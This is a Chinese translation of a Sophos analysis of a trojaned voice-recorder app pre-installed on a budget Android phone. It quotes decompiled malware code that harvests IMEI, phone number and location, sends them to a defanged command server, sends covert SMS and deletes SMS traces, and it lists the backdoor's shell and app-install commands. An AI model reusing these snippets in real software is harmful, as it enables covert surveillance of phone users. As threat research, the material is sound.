本文为翻译稿件，原文来自
    https://news.sophos.com/en-us/2018/10/02/the-price-of-a-cheap-mobile-phone-may-include-your-privacy/
    我们使用Trojaned第三方应用程序查看出厂时已安装恶意软件的手机时发现，廉价的手机可能受到“供应链危机”的影响。
如今，在购买新的Android手机时，用户可以根据自己的预算进行许多选择。 但是一些廉价的非品牌手机可能无法提供使用品牌手机的客户所期望的相同水平的服务。
在某些情况下，用户在厂商处购买的新手机可能预先安装了可能不需要的应用程序（PUA）甚至恶意软件 - 这种情况称为“供应链妥协”。
如今，直接从制造商处发货的手机中预装了大量恶意软件与不需要的应用程序。我们所发现的手机制造商均有过这样的情况。许多Android手机和其他移动设备制造商都捆绑了第三方的应用程序。
通常这些应用程序安装在高权限应用的两个位置其中某一个，即`/ system / app`或`/ system / priv-app`文件夹。
理论上，安装到这些位置的应用程序应该是受信任，例如文件管理器或其他实用程序。 实际上，应用程序制造商有时会向手机制造商付费用以将程序初始化安装在出厂手机中。
这种商业模式没有任何实质性的错误，因为手机制造商可以通过这种模式来保持产品的低价格，应用程序开发人员可以根据此来推广自己的产品并建立良好的声誉。
另一方面，并不是每个使用者都能够很完善的使用自己的应用。由于开发人员编码不当或者为了更多的盈利，他们开发的应用程序有可能包含不良的功能。
最近我们遇到了一个有趣的Android无线接入技术，它以第三方应用程序的形式预装，而此手机来自一家不太知名的制造商。
## 恶意录音功能
2017年12月，在Android手机爱好者所欢迎的留言板上我们能看到，  
最近某些手机上的应用收到了手机杀毒软件的病毒警告。这款名为“录音机”的应用程序与深圳uleFone制造的S8 Pro捆绑在一起。
这是一款质地光滑的Android手机，它的设计理念令消费者印象深刻。
为证实此声明，我们购买了相同型号的手机。 我们下载并检查了制造商在其技术支持页面上链接的此型号手机的镜像内容。
在`/ system / priv-app`文件夹中我们发现了所谓的恶意录音机应用程序SoundRecorder.apk。我们认为此版本的应用是一种故意化木马程序。此恶意软件通过向合法应用程序添加一个名为com.android.prize的恶意模块生成的。
这个应用程序没有收益且该模块与录音无关。
相反，它收集用户的个人信息（例如电话号码和地理位置）并将其发送到远程服务器。目前我们还不清楚这是一种恶意代码，还是只是一个具有侵略性的应用分析工具。
更为恶意的是，它还能够将SMS发送到应用程序的数字列表硬编码中，并且用户在没有收到通知或同意的情况下通过SMS消息接收RAT指令。
下图将左侧受感染应用程序的结构与右侧感染之前的合法应用程序进行比较。 请注意红色框中的功能名称。
### 不必要行为
恶意行为以BroadcastReceiver开始 —一个等待手机在完成引导时发送的BOOT_COMPLETED广播的类。
此机制为恶意软件提供持久性，以便它可以在重新启动后继续运行。
在BroadcastReceiver类中，应用程序启动一个名为ClickSimStateService的服务。
此服务可以收集大量详细的私人信息并向中央服务器发送。而信息包括电话的唯一IMEI标识符，电话号码和位置。
    Object v5 = arg15.getSystemService("phone");
    this.imsi = ((TelephonyManager)v5).getSubscriberId();
    this.imei = SalesStatisUtil.getIMEI(arg15);
    this.mobile = ((TelephonyManager)v5).getLine1Number();
    this.provider = this.getProvider(this.imsi);
    ClientInfo.networkType = ((byte)ClientInfo.getAPNType(arg15));
接下来，它使用百度位置API获取设备的位置：
    String v0 = arg9.getAddrStr();
    if(v0 != null) {
    DecimalFormat v2 = new DecimalFormat("###.0000");
    Log.v("PrizeSalesStatis", "[StartSalesStatisService]----BigDecimal bd = " + new BigDecimal(arg9.getLatitude()).setScale(2, 4).toString());
    StartSalesStatisService.this.latitude = Double.valueOf(v2.format(arg9.getLatitude()));
    StartSalesStatisService.this.longitude = Double.valueOf(v2.format(arg9.getLongitude()));
然后，该模块将所有收集的信息打包为JSON格式，并在此用HTTP协议进行POST传递：
    hxxp://dt.szprize.cn/mbinfo.php
它收集并提交给远程服务器的信息包括：
  * 手机号码
  * 经纬度、街道等位置信息
  * IMEI表示符、安卓ID
  * 屏幕分辨率
  * 生产商、手机型号
  * cpu信息
  * 网络类型
  * mac物理地址
  * ram和rom的大小
  * sd卡的大小
  * 语言与国家
  * 手机设备提供商
目前我们并不清楚这是录音机的应用程序分析组件还是恶意软件程序将配置文件信息发送到其c2服务器。
然后，更为恶意的模块创建了另一个名为AutoSendSmsService的服务，该服务将设备模型信息和IMEI的SMS值随机发送到硬编码列表中的一个电话号码中去：
    AutoSendSmsService.telNumber = AutoSendSmsService.telephoneNum[this.readomTelNum()];
    Log.v("PrizeSalesStatis", "---- ----> devicestate == " + this.getDeviceInfo());
    this.sendsms(AutoSendSmsService.telNumber, this.getDeviceInfo());
接下来，它监听广播SMS_RECEIVED和SMS_SENT。 这些广播在每次电话发送或接收文本消息时都会生成。
通常，手机会将消息发送到用户安装的SMS应用程序中，但恶意SMS代码会对消息进行拦截并删除，因此它们永远不会在手机的短信应用中显示。
    AutoSendSmsService.this.deleteSMS(this.val$context, this.val$curStr, "content://sms/failed");
    AutoSendSmsService.this.deleteSMS(this.val$context, this.val$curStr, "content://mms/drafts");
    AutoSendSmsService.this.deleteSMS(this.val$context, this.val$curStr, "content://sms/sent");
    AutoSendSmsService.this.deleteSMS(this.val$context, this.val$curStr, "content://mms/inbox");
    AutoSendSmsService.this.deleteSMS(this.val$context, this.val$curStr, "content://sms/outbox");
最终利用上述方法，恶意程序会在用户设备中隐藏自己的SMS功能的痕迹。
### 后门程序的功能
泄露个人信息并发送隐蔽的短信似乎还不够糟糕，恶意应用也有它的后门。它通过HTTP协议与C2服务器联系以获取指令，并可以执行以下任务：
  * 下载安装应用
  * 卸载应用程序
  * 执行shell指令
  * 在浏览器中打开URL地址（这个功能在我们分析的例子中非常有效果）
为了避免被分析软件发现，此恶意软件使用了各种方法保持隐蔽性。其中一些方法也十分有趣。
  * 后门模块伪装成Android支持代码库的一部分。  
``